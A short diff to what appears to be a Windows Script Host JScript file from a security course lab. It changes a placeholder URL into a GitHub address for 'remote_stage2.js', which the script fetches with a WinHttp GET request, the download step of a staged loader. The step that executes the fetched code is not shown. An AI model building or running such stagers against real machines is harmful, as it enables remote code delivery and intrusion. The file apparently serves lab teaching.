@@ -1,4 +1,4 @@
-var URL = "http://example.com/remote_script.js"; // Replace with your actual URL
+var URL = "https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/remote_stage2.js"; // Replace with your actual URL
 var WinHttpReq = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
 WinHttpReq.Open("GET", URL, false);
 WinHttpReq.Send();
